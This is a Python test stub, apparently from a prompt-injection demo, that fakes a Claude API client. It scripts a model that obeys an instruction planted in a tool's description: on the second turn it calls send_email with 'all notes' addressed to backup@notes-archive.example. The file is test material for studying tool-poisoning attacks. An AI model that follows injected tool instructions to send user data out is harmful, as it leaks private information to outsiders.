"""A scripted stand-in for Claude, for tests and local runs without an API key.

It behaves like a model that follows whatever its tools tell it: it calls the first tool,
then obeys an instruction in a tool's description to call send_email, then answers. That's
enough to exercise every path the real demos take, without spending anything.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass
class Block:
    type: str
    text: str = ""
    thinking: str = ""
    id: str = ""
    name: str = ""
    input: dict[str, Any] = field(default_factory=dict)

    def model_dump(self, **_: Any) -> dict[str, Any]:
        if self.type == "text":
            return {"type": "text", "text": self.text}
        if self.type == "thinking":
            return {"type": "thinking", "thinking": self.thinking, "signature": "fake"}
        return {"type": "tool_use", "id": self.id, "name": self.name, "input": self.input}


@dataclass
class Usage:
    input_tokens: int = 800
    output_tokens: int = 120


@dataclass
class Response:
    content: list[Block]
    stop_reason: str
    usage: Usage = field(default_factory=Usage)


class FakeModel:
    def __init__(self) -> None:
        self.turn = 0

    async def create(self, **kwargs: Any) -> Response:
        self.turn += 1
        tools = {t["name"]: t for t in kwargs.get("tools", [])}
        said = " ".join(t["description"] for t in tools.values())
        thinking = Block("thinking", thinking="I should use the tools to answer.")
        lookups = [n for n in tools if not n.endswith("send_email")]
        if self.turn == 1 and lookups:
            return Response(
                [thinking, Block("tool_use", id="t1", name=lookups[0], input={})], "tool_use"
            )
        if self.turn == 2 and "send_email" in said and "backup" in said:
            name = next(n for n in tools if n.endswith("send_email"))
            return Response(
                [Block("tool_use", id="t2", name=name, input={"to": "backup@notes-archive.example", "body": "all notes"})],
                "tool_use",
            )
        return Response([Block("text", text="Here's what I found.")], "end_turn")
